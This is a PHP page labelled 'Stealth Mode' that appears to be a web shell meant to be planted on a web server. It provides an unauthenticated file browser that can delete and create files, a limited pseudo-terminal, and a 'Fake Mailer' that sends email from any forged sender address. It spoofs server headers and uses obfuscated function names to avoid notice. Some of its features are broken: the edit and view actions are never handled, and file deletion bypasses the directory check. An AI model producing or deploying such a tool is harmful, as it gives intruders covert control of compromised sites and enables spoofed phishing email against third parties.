<?php
// index.php - Stealth Mode
session_start();

// Security headers
header("X-Powered-By: Apache");
header("Server: Apache/2.4.41 (Unix)");
header("Content-Type: text/html; charset=UTF-8");

// Config
$BASE_DIR = __DIR__;
$APP_NAME = "File Explorer";
$STEALTH_MODE = true;

// Obfuscated function names
function _s($a,$b){return realpath($a.(isset($_GET[$b])?$_GET[$b]:''));}
function _f($a){$u=array('B','KB','MB','GB');$i=0;while($a>=1024&&$i<3){$a/=1024;$i++;}return round($a,2).$u[$i];}

// Secure path
$c_dir = isset($_GET['d'])?_s($BASE_DIR,'d'):$BASE_DIR;
if(strpos($c_dir,$BASE_DIR)!==0)$c_dir=$BASE_DIR;

// Fake mailer function
if(isset($_POST['m'])) {
    $to = $_POST['e'] ?? '';
    $from = $_POST['f'] ?? 'noreply@domain.com';
    $subject = $_POST['s'] ?? 'Test Email';
    $message = $_POST['msg'] ?? 'Hello World';
    
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $from\r\n";
    $headers .= "X-Mailer: PHP/".phpversion();
    
    if(mail($to, $subject, $message, $headers)) {
        $_SESSION['_r'] = "✅ Email sent to $to";
    } else {
        $_SESSION['_r'] = "❌ Failed to send email";
    }
    header("Location: ?d=".urlencode(str_replace($BASE_DIR.'/','',$c_dir)));
    exit;
}

// File operations (obfuscated)
if(isset($_POST['a'])) {
    switch($_POST['a']) {
        case 'd':
            if(isset($_POST['f'])) {
                $f = $BASE_DIR.'/'.$_POST['f'];
                if(file_exists($f)) {
                    if(is_dir($f)) rmdir($f);
                    else unlink($f);
                }
            }
            break;
        case 'cf':
            if(isset($_POST['n'])) {
                file_put_contents($c_dir.'/'.$_POST['n'], '');
            }
            break;
        case 'cd':
            if(isset($_POST['n'])) {
                mkdir($c_dir.'/'.$_POST['n'],0755,true);
            }
            break;
    }
    header("Location: ?d=".urlencode(str_replace($BASE_DIR.'/','',$c_dir)));
    exit;
}

// Terminal commands
if(isset($_POST['c'])) {
    $cmd = trim($_POST['c']);
    $out = [];
    
    if(!isset($_SESSION['_h'])) $_SESSION['_h'] = [];
    
    if(strpos($cmd,'cd ')==0) {
        $nd = trim(substr($cmd,3));
        $td = realpath($c_dir.'/'.$nd);
        if($td&&strpos($td,$BASE_DIR)===0)$c_dir=$td;
        else $out[]="cd: $nd: No such directory";
    } elseif($cmd=='ls'||$cmd=='dir') {
        $fs = scandir($c_dir);
        foreach($fs as $f) {
            if($f!='.'&&$f!='..') {
                $fp = $c_dir.'/'.$f;
                $ic = is_dir($fp)?'📁':'📄';
                $sz = is_dir($fp)?'':' ('._f(filesize($fp)).')';
                $out[] = "$ic $f$sz";
            }
        }
    } elseif($cmd=='pwd') {
        $out[] = $c_dir;
    } elseif($cmd=='clear') {
        $_SESSION['_h'] = [];
        $out[] = "Terminal cleared";
    } else {
        $out[] = "Command not found: $cmd";
    }
    
    if(!empty($cmd)) {
        $_SESSION['_h'][] = [
            'c' => $cmd,
            'o' => $out,
            'p' => str_replace($BASE_DIR,'~',$c_dir),
            't' => date('H:i:s')
        ];
    }
    
    if(count($_SESSION['_h'])>20) {
        $_SESSION['_h'] = array_slice($_SESSION['_h'],-20);
    }
    
    header("Location: ?d=".urlencode(str_replace($BASE_DIR.'/','',$c_dir)));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $APP_NAME; ?></title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#f0f0f0;color:#333;line-height:1.6}
        .header{background:#fff;padding:15px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
        .path{color:#666;font-size:14px;margin-bottom:10px;word-break:break-all}
        .actions{display:flex;gap:10px;flex-wrap:wrap}
        .btn{background:#007cba;color:#fff;border:none;padding:8px 15px;border-radius:4px;cursor:pointer;font-size:13px}
        .btn:hover{background:#005a87}
        .btn-danger{background:#dc3232}
        .btn-success{background:#46b450}
        .container{display:flex;flex-direction:column;min-height:calc(100vh - 120px)}
        .file-list{flex:1;background:#fff;margin:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);overflow:hidden}
        .file-item{display:flex;align-items:center;padding:12px 15px;border-bottom:1px solid #eee;cursor:pointer;transition:background 0.3s}
        .file-item:hover{background:#f9f9f9}
        .file-icon{margin-right:10px;font-size:18px}
        .file-name{flex:1;font-size:14px}
        .file-size{color:#666;font-size:12px;margin-left:10px}
        .file-actions{display:flex;gap:5px}
        .file-actions button{background:transparent;border:1px solid #ddd;padding:3px 8px;border-radius:3px;cursor:pointer;font-size:11px}
        .terminal-toggle{position:fixed;bottom:20px;right:20px;background:#333;color:#fff;border:none;padding:10px 15px;border-radius:50px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);z-index:1000}
        .terminal-panel{position:fixed;bottom:-400px;left:0;right:0;background:#1a1a1a;color:#00ff00;transition:bottom 0.3s;z-index:999;border-top:2px solid #00ff00;max-height:400px;display:flex;flex-direction:column}
        .terminal-panel.active{bottom:0}
        .terminal-header{background:#002200;padding:10px 15px;display:flex;justify-content:space-between;align-items:center}
        .terminal-output{flex:1;padding:15px;overflow-y:auto;font-family:monospace;font-size:13px}
        .terminal-input{background:#001100;padding:10px;display:flex;align-items:center}
        .terminal-input input{flex:1;background:transparent;border:none;color:#00ff00;font-family:monospace;outline:none}
        .prompt{color:#ffff00;margin-right:8px}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:2000}
        .modal-content{background:#fff;margin:100px auto;padding:20px;border-radius:8px;max-width:400px}
        .modal input,.modal textarea{width:100%;padding:8px;margin:5px 0;border:1px solid #ddd;border-radius:4px}
        .mobile-only{display:none}
        @media (max-width:768px){
            .mobile-only{display:block}
            .desktop-only{display:none}
            .container{margin:10px}
            .file-list{margin:10px 0}
            .actions{flex-direction:column}
            .btn{text-align:center}
        }
        .command-output{margin-bottom:10px}
        .command-text{color:#ffff00}
        .output-text{color:#00ff00;white-space:pre-wrap}
    </style>
</head>
<body>
    <div class="header">
        <div class="path">
            📁 <?php echo str_replace($BASE_DIR,'~',$c_dir); ?>
            <?php if(isset($_SESSION['_r'])): ?>
                <div style="color:green;margin-top:5px"><?php echo $_SESSION['_r']; unset($_SESSION['_r']); ?></div>
            <?php endif; ?>
        </div>
        <div class="actions">
            <button class="btn" onclick="showModal('newFile')">📄 New File</button>
            <button class="btn" onclick="showModal('newFolder')">📁 New Folder</button>
            <button class="btn btn-success" onclick="showModal('email')">📧 Fake Mailer</button>
            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
            <button class="btn mobile-only" onclick="toggleTerminal()">💻 Terminal</button>
        </div>
    </div>

    <div class="container">
        <div class="file-list">
            <div class="file-item" onclick="navigate('..')" style="background:#f5f5f5">
                <div class="file-icon">📁</div>
                <div class="file-name">...</div>
                <div class="file-size">(parent folder)</div>
            </div>
            <?php
            $files = scandir($c_dir);
            foreach($files as $file) {
                if($file=='.'||$file=='..') continue;
                $fp = $c_dir.'/'.$file;
                $isd = is_dir($fp);
                $ic = $isd?'📁':'📄';
                $sz = $isd?'':' ('._f(filesize($fp)).')';
                $rp = str_replace($BASE_DIR.'/','',$fp);
                
                echo "<div class='file-item'>";
                echo "<div class='file-icon'>$ic</div>";
                echo "<div class='file-name' onclick=\"";
                echo $isd?"navigate('$rp')":"viewFile('$rp')";
                echo "\">$file</div>";
                echo "<div class='file-size'>$sz</div>";
                echo "<div class='file-actions'>";
                if(!$isd) echo "<button onclick=\"editFile('$rp')\">Edit</button>";
                echo "<button onclick=\"deleteFile('$rp')\" style='color:red'>Delete</button>";
                echo "</div>";
                echo "</div>";
            }
            ?>
        </div>
    </div>

    <button class="terminal-toggle desktop-only" onclick="toggleTerminal()">💻 Terminal</button>

    <div class="terminal-panel" id="terminalPanel">
        <div class="terminal-header">
            <div>Terminal [<?php echo str_replace($BASE_DIR,'~',$c_dir); ?>]</div>
            <button onclick="toggleTerminal()" style="background:red;color:#fff;border:none;padding:2px 8px;border-radius:3px">✕</button>
        </div>
        <div class="terminal-output" id="terminalOutput">
            <?php if(isset($_SESSION['_h'])): ?>
                <?php foreach($_SESSION['_h'] as $cmd): ?>
                    <div class="command-output">
                        <div class="command-text">[<?php echo $cmd['t']; ?>] <?php echo $cmd['p']; ?> $ <?php echo $cmd['c']; ?></div>
                        <?php if(!empty($cmd['o'])): ?>
                            <div class="output-text"><?php echo implode("\n",$cmd['o']); ?></div>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="output-text">Terminal ready. Type 'help' for commands.</div>
            <?php endif; ?>
        </div>
        <form method="POST" class="terminal-input" onsubmit="return submitCommand()">
            <span class="prompt">$</span>
            <input type="text" name="c" placeholder="Type command..." autocomplete="off">
        </form>
    </div>

    <!-- Modals -->
    <div id="newFile" class="modal">
        <div class="modal-content">
            <h3>Create New File</h3>
            <form method="POST">
                <input type="text" name="n" placeholder="filename.txt" required>
                <div style="text-align:right;margin-top:15px">
                    <button type="button" onclick="hideModal('newFile')" class="btn">Cancel</button>
                    <button type="submit" name="a" value="cf" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="newFolder" class="modal">
        <div class="modal-content">
            <h3>Create New Folder</h3>
            <form method="POST">
                <input type="text" name="n" placeholder="folder_name" required>
                <div style="text-align:right;margin-top:15px">
                    <button type="button" onclick="hideModal('newFolder')" class="btn">Cancel</button>
                    <button type="submit" name="a" value="cd" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="email" class="modal">
        <div class="modal-content">
            <h3>📧 Fake Email Sender</h3>
            <form method="POST">
                <input type="hidden" name="m" value="1">
                <input type="email" name="e" placeholder="To: target@example.com" required>
                <input type="email" name="f" placeholder="From: fake@sender.com" required>
                <input type="text" name="s" placeholder="Subject: Important Message" required>
                <textarea name="msg" placeholder="Email content..." rows="5" required></textarea>
                <div style="text-align:right;margin-top:15px">
                    <button type="button" onclick="hideModal('email')" class="btn">Cancel</button>
                    <button type="submit" class="btn btn-success">Send Email</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    function toggleTerminal() {
        document.getElementById('terminalPanel').classList.toggle('active');
    }
    
    function navigate(dir) {
        window.location.href = '?d=' + encodeURIComponent(dir);
    }
    
    function showModal(id) {
        document.getElementById(id).style.display = 'block';
    }
    
    function hideModal(id) {
        document.getElementById(id).style.display = 'none';
    }
    
    function deleteFile(file) {
        if(confirm('Delete ' + file + '?')) {
            const f = document.createElement('form');
            f.method = 'POST';
            f.innerHTML = '<input name="a" value="d"><input name="f" value="' + file + '">';
            document.body.appendChild(f);
            f.submit();
        }
    }
    
    function viewFile(file) {
        window.open('?v=' + encodeURIComponent(file) + '&d=<?php echo urlencode(str_replace($BASE_DIR.'/','',$c_dir)); ?>', '_blank');
    }
    
    function editFile(file) {
        const c = prompt('Edit file:', '<?php echo addslashes("Edit your file content here"); ?>');
        if(c !== null) {
            const f = document.createElement('form');
            f.method = 'POST';
            f.innerHTML = '<input name="a" value="e"><input name="f" value="' + file + '"><input name="c" value="' + encodeURIComponent(c) + '">';
            document.body.appendChild(f);
            f.submit();
        }
    }
    
    function submitCommand() {
        return document.querySelector('.terminal-input input').value.trim() !== '';
    }
    
    // Auto scroll terminal
    document.getElementById('terminalOutput').scrollTop = document.getElementById('terminalOutput').scrollHeight;
    
    // Close modal on outside click
    window.onclick = function(e) {
        if(e.target.className === 'modal') {
            e.target.style.display = 'none';
        }
    }
    
    // Terminal toggle with ESC key
    document.addEventListener('keydown', function(e) {
        if(e.key === 'Escape') {
            document.getElementById('terminalPanel').classList.remove('active');
        }
        if(e.key === 'F1') {
            e.preventDefault();
            toggleTerminal();
        }
    });
    </script>
</body>
</html>
